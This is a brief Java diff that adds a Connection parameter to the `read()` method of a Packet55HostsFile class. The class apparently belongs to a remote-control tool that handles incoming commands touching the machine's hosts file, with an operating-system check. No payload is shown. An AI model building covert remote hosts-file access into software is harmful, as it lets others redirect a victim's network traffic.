@@ -14,7 +14,7 @@ import com.redpois0n.oslib.OperatingSystem;
 public class Packet55HostsFile extends AbstractIncomingPacket {
 
 	@Override
-	public void read() throws Exception {
+	public void read(Connection con) throws Exception {
 		File file = null;
 
 		if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.WINDOWS) {
